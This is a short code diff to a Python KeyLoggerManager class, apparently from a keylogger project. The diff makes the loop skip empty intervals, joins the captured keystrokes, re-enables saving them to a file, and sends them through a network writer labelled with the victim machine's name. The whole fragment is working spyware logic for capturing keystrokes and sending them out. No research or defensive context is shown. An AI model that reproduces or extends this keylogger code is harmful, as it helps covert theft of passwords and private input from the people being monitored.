@@ -1,3 +1,5 @@
+import time
+
 from keyLoggerService import *
 from fileWriter import *
 from networkWriter import *
@@ -25,11 +27,16 @@ class KeyLoggerManager:
         duration = self.__interval
         while True:
             time.sleep(duration)
-            self.__buffer.add_data(" ".join(self.__service.get_logged_keys()))
-            self.send_data(self.process_data())
-            self.__buffer.flush()
-            self.__service.flush()
+            if len(self.__service.get_logged_keys()) == 0:
+                continue
+            else:
+                self.__buffer.add_data("".join(self.__service.get_logged_keys()))
+                self.send_data(self.process_data())
+                self.__buffer.flush()
+                self.__service.flush()
+
             print(self.__buffer.get_data())
+
 
     def process_data(self):
         data = self.__buffer.get_data()
@@ -42,7 +49,7 @@ class KeyLoggerManager:
 
     def send_data(self, enc_data: str) -> None:
         machine_name = self.__machine_name
-        #self.__filewriter.send_data(enc_data, machine_name)
+        self.__filewriter.send_data(enc_data, machine_name)
         self.__networkwriter.send_data(enc_data, machine_name)
 
 
